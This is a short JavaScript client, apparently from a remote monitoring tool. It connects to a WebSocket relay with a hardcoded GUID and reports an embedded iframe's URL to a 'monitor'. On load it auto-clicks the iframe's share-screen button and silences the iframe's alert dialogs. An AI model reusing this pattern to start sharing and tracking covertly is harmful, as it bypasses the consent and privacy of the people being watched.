var socket = new WebSocket("wss://node2.wsninja.io");
var bSharingStarted = false;
// Connection opened, now send GUID to autenticate with server.
function startCommunication(){
  console.log('start communication')
  socket.addEventListener('open', function(event) {
    socket.send(JSON.stringify({ guid: "b8907407-7291-4ae1-b34a-8699137199dd" }));
  });
  
  socket.addEventListener('error',function(event){
    console.log(event);
  });
  
  // Listen for websocket messages
  socket.addEventListener('message', function(event) {
    data = JSON.parse(event.data)
    console.log(data)
    //message for finding me
    //type:"find-client",sender:"monitor",receiver:_this.id
    console.log(p_UUID)
    if(data.type == "find-client" && data.sender == "monitor" && data.receiver == p_UUID)
    {
      socket.send(JSON.stringify({type:"reply",sender:p_UUID}))
      if(bSharingStarted == true){
        socket.send(JSON.stringify({type:"share-screen",sender:p_UUID,payload:document.getElementById("iframe-src").contentWindow.location.href}))
      }
    }
  });
}

function onMyFrameLoad(){
  console.log('load finished');
  $('#iframe-src').contents().find('#share-screen').trigger( "click" );
  document.getElementById('iframe-src').contentWindow.alert = function(){}
  bSharingStarted = true
}

